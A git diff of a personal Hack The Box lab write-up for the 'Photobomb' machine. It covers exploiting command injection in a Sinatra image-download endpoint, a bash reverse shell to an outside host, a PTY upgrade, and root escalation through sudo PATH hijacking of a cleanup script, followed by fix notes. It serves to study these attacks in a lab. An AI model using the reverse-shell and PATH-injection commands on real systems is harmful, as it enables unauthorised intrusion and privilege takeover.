@@ -14,9 +14,7 @@ Learnt:
 - I need to do more Novel-For-Me stuff to improve how I overcoming new challenges
 - Add parameters - I tried injecting into what was avaliable sometimes try the null space...
 - I need to rope learn the symaticaticness of check today. 
-- Beyond Root:
-- Make a crontab Persistence with `crontab -e`
-- The beyond root for this box is to do three htb boxes, short machine that have a web exploit, easy to practice fine tuning methodolgy on each as follow up.
+	- I need to practice fine tuning methodolgy on a set of 10 boxes over the coming months and a half as general follow up, before continuing with more PG or OSCP-likes.
 Beyond Root:
 - Azure AZ 104 contextualise
 	- Update and fault domain 
@@ -42,16 +40,17 @@ Peaking thirough the app with `CTRL+U`
 The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
 ![ping](HackTheBox/Retired-Machines/PhotoBomb/Screenshots/ping.png)
 
-SSH x Ubunutu versioning: [Ubuntu Bionic](https://launchpad.net/ubuntu/+source/openssh/1:7.6p1-4ubuntu0.5)
+- SSH x Ubunutu versioning: [Ubuntu Bionic](https://launchpad.net/ubuntu/+source/openssh/1:7.6p1-4ubuntu0.5)
+- nmap reported the redirect to photobomb.htb
 
-nmap report the redirect to photobomb.htb
-
-We need credentialsThis lead to the Download testing:
+We need credentials...
 ![](kevin-charit-XZoaTJTnB9U-unsplash_3000x2000.png)
 Contrasting white and water and the states of water make this photo make you feel cold and breath-taken-and-replaced-with-icy-Oxygen.
+
+This lead to the Download testing:
 ![1080](welcomepacktofind.png)
 
-Sinartra is a ruby framework I later dorked...
+Sinatra is a ruby framework I later dorked...
 ![1080](niktofindweirdness.png)
 
 On using hostname with nikto got some weird negatives hitting on the same Sinatra backend
@@ -91,7 +90,7 @@ pH0t0:b0Mb!
 I tried LFI
 ![1080](nonexistent.png)
 
-Forum hinted, began fuzxzing parameter
+Forum hinted, began fuzzing parameter
 - Fuzz the parametres
 ![1080](inject.png)
 
@@ -111,14 +110,13 @@ Right:
 
 Wrong:
 - Did not check:
-	- `php://` filters 
+	- `php://` filters [[Watcher-Helped-Through]] - here we go!
 		- Its actual ruby not php and not js
 - I definately hung the application on the filetype, but could not replicate it again and 
 - Forums can be a rabbit hole in themselves
 	- You think that some step to a answer is sort of there and you give that information more legitamacy that it should
 - Not Enforce manditory C+P of Checks per X vuln, (Y(i) parametre, SEND-TYPE,) 
 	- Big O Notation of rabbit holes... nice.
-
 
 Novel methodology:
 - Add a `.` betwen `filename` and `.ext` for invalid file checks
@@ -136,8 +134,12 @@ convert -input $photo -size $dimensions -type $filetype;sleep 5; -
 // Remember /usr/bin/sleep, ping for callback
 ```
 
+[Ama2 points out](https://forum.hackthebox.com/t/official-photobomb-discussion/265724/134):
+
 https://portswigger.net/web-security/os-command-injection
 https://www.golinuxcloud.com/create-reverse-shell-cheat-sheet/
+https://systemweakness.com/linux-privilege-escalation-using-path-variable-manipulation-64325ab05469
+
 
 ## Exploit
 
@@ -146,7 +148,7 @@ The reason I think this photo is hilarious is the bias in my head of people with
 
 At this point I listened to the intro of the Ippsec Video. Sintra is framework. I dorked it in the second session, but me thinking it was some kind of User/Bot thing that lead nowhere had lead to me not aligning Framework -> Language RCE in that language maybe as I was trying Express.
 
-![](cmdirevshell.png)
+![1080](cmdirevshell.png)
 
 ## Foothold
 
@@ -169,9 +171,10 @@ This user has a home directory so was created with box deployment/installation a
 ![](withhomedir.png)
 
 Research 
-- env_reset
+- env_reset 
 	- Used to reset the env after completing use of sudo
 - mail_badpass
+	- Sends mail to bad sudo usages.
 
 We are running this as root
 ```bash
@@ -193,6 +196,7 @@ find source_images -type f -name '*.jpg' -exec chown root:root {} \;
 ```
 
 Make a priceless shell with /bin/bash with setuid then let the script change it to be owned by root. 
+- Incorrect chown resets any special setuid permission because you are change a user context.
 
 ## PrivEsc
 
@@ -206,31 +210,106 @@ chmod +s pricelessprivesc.jpg
 ```
 
 But we need to configure the env_reset to prevent loss of sudo env
+- Incorrect as env_reset just reset env
 
 Incoming... https://superuser.com/questions/232231/how-do-i-make-sudo-preserve-my-environment-variables and beyond...
+
+On returning to this box [Hack-Tools](https://github.com/LasCC/Hack-Tools) got updated! For some reason there is not -c, but there is loads of new features! More reverse shells and shell drop down for defining sh, bash, powershell, cmd! 
+```bash
+Authorization: Basic cEgwdDA6YjBNYiE=
+bash+-c+'exec+bash+-i+>%26+/dev/tcp/10.10.14.122/33300+0>%261'
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+stty raw -echo;fg
+```
+
+Before looking at [the hinted blog](https://systemweakness.com/linux-privilege-escalation-using-path-variable-manipulation-64325ab05469)
+- It is a path variable....
+```bash
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+```
+OK either we inject a shell that is named `find` into a path or I am incorrect. 
+![](roguefindinthepath.png)
+Due working out I am incorrect I then read the article...we can just write our own path because we own the pathing...
+![](whatamidoingwrong.png)
+
+Rust is showing. OK Ippsec explains:
+- Sudo needs a path because sudo need a `PATH=...` 
+
+I really have not done Linux PrivEsc like this in a while...well that decide the next Azure connected box
+
+```bash
+sudo PATH=/tmp:$PATH /opt/cleanup.sh
+```
 
 The colours of this photo are awesome.
 ![](mark-mc-neill-4xWHIpY2QcY-unsplash_3000x2000.png)
 
+For the additional way describe by [Ippsec](https://www.youtube.com/watch?v=-4asq6Tldf0) was something I wondered as to why it was calling .bashrc that is root owned in /opt/
+```bash
+# .bashrc weirdness
+# disabling a bash builtin may lead to path injection
+enable -n $Builtin
+# As pathing to the builtin that is a file is then controllable:
+export PATH=/dev/shm:$PATH
+/dev/shm/[
+```
 
-From the forum not read.
-https://systemweakness.com/linux-privilege-escalation-using-path-variable-manipulation-64325ab05469
-
-
-Add
+Look into the following as Sinatra and Ruby web apps have never come up in CTFs so I researched:
 https://security.snyk.io/package/rubygems/sinatra
 https://github.com/sinatra
 https://cheatsheetseries.owasp.org/cheatsheets/Ruby_on_Rails_Cheat_Sheet.html
 
+Latter provides some interesting reading:
+- Ruby has xss I thought that was just a javascript thing
+Also read [0xdf for the complete Ippsec x 0xDF bare minimum](https://0xdf.gitlab.io/2023/02/11/htb-photobomb.html#shell-as-root) which lead to reading the [enable man page](https://linuxcommand.org/lc3_man_pages/enableh.html), which  is nice and short 
+
 ## Beyond Root
 
-Fix the CMDi vulnerability
+#### Fixing the website
 
-Fix the PrivEscs
+Remove link the Javascript file that discloses 
+```bash
+rm public/photobomb.js
+# Talk to the tech support manager.
+```
+
+Fix the CMDi vulnerability
+```ruby 
+# Original
+if !filetype.match(/^(png|jpg)/)
+	halt 500, 'Invalid filetype.'
+end
+# Added conditional
+if filetype.match(/[!@#$^&*()_-;:_*]/)
+	halt 500, 'CMDi Detected'
+```
+
+#### Fixing the PrivEscs
+
+Re-structure the users 
+```bash
+# Add a website user
+useradd www-data
+
+mv photobomb /var/www/html/
+chown -R www-data:www-data
+
+```
+
+If they really wanted a local backup.
+```bash
+cp -r source_images/ root/source_images
+```
+
+
+#### Azure
+
+First and most improtantly Azure storage of the images in a geo-zonal redundant vault for maximum retention of th original sources.
 
 ![](Photobomb4Azure)
 
-- Azure AZ 104 contextualise 
+- Azure AZ 104 contextualise objectives
 	- Update and fault domains 
 	- Host Photobomb as an app service plan and discuss context 
 	- Application Proxy and use case in Photobomb
@@ -254,5 +333,10 @@ Also a Public version using a App server plan
 Add a Application proxy and discuss Application gateway use
 
 Custom DNS 
+
+Fix the website recap - TIL Azure DevOps, Azure IAM with SAS and SSPR, while creating a Azure K8 for testing:
+1. Allow linking to the photobomb download page - assume people are able to use it- fix the cmdi as provide
+2. Remove the cookie to access
+	1. Create SAS tokens for guest consultant Developers and Techsupport to access the Dev site
 
 
